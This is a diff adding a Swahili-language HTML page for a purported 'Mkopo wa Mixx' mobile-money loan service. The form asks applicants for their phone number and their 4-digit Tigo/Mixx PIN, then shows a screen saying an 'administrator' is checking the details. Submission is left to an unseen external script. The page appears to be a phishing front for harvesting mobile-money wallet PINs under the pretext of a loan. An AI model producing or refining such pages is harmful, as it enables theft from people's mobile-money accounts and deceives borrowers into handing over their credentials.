@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uthibitishaji wa PIN - Mkopo wa Mixx</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body class="app-page">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="app-header">
+            <div class="logo-small">💰 Mkopo wa Mixx</div>
+            <div class="security-indicator">
+                <span class="lock-icon">🔒</span>
+                <span>Uthibitishaji wa PIN</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Maelezo Binafsi</span>
+                </div>
+                <div class="step-line active"></div>
+                <div class="step-item active">
+                    <div class="step-circle">2</div>
+                    <span>Uthibitishaji</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step-item">
+                    <div class="step-circle">3</div>
+                    <span>Idhini</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- PIN Entry Screen -->
+        <div id="pinScreen" class="form-card">
+            <h1 class="form-title">Thibitisha Utambulisho Wako</h1>
+            <p class="form-subtitle">Tunahitaji kuthibitisha simu yako na PIN yako ya Mixx</p>
+
+            <div class="form-group">
+                <label>Nambari ya Simu *</label>
+                <input type="tel" id="phoneNumber" required placeholder="+255712345678" class="large-input">
+                <small class="help-text">Weka nambari yako ya simu ya Mixx</small>
+            </div>
+
+            <div class="form-group">
+                <label>PIN ya Tigo (Nambari 4) *</label>
+                <input type="password" id="pin" required maxlength="4" placeholder="****" class="large-input pin-input" inputmode="numeric">
+                <small class="help-text">Weka PIN yako ya Mixx yenye nambari 4</small>
+            </div>
+
+            <button id="verifyPinBtn" class="submit-button">
+                Thibitisha na Endelea
+                <span class="arrow">→</span>
+            </button>
+
+            <div class="info-box">
+                <p><strong>Kwa nini tunahitaji hii?</strong></p>
+                <p>Tunahakikisha kuwa wewe ndiye mmiliki wa akaunti na kuzuia matumizi yasiyo ya halali ya taarifa zako.</p>
+            </div>
+        </div>
+
+        <!-- Processing Screen -->
+        <div id="processingScreen" class="form-card" style="display: none;">
+            <div class="processing-content">
+                <div class="spinner-large"></div>
+                <h2 class="processing-title">Tunathibitisha Taarifa Zako</h2>
+                <p class="processing-text">Tafadhali subiri wakati tunathibitisha nambari yako ya simu na PIN...</p>
+                
+                <div class="status-box">
+                    <span class="status-dot"></span>
+                    <span>Tunakagua na msimamizi...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rejection Screen -->
+        <div id="rejectionScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon error">✕</div>
+                <h2 class="result-title">Taarifa Batili</h2>
+                <p class="result-text">Samahani, taarifa ulizotoa hazijakubaliwa. Tafadhali jaribu tena au wasiliana na msaada.</p>
+                <button class="submit-button" onclick="location.reload()">
+                    Jaribu Tena
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="verification-script.js"></script>
+</body>
+</html>
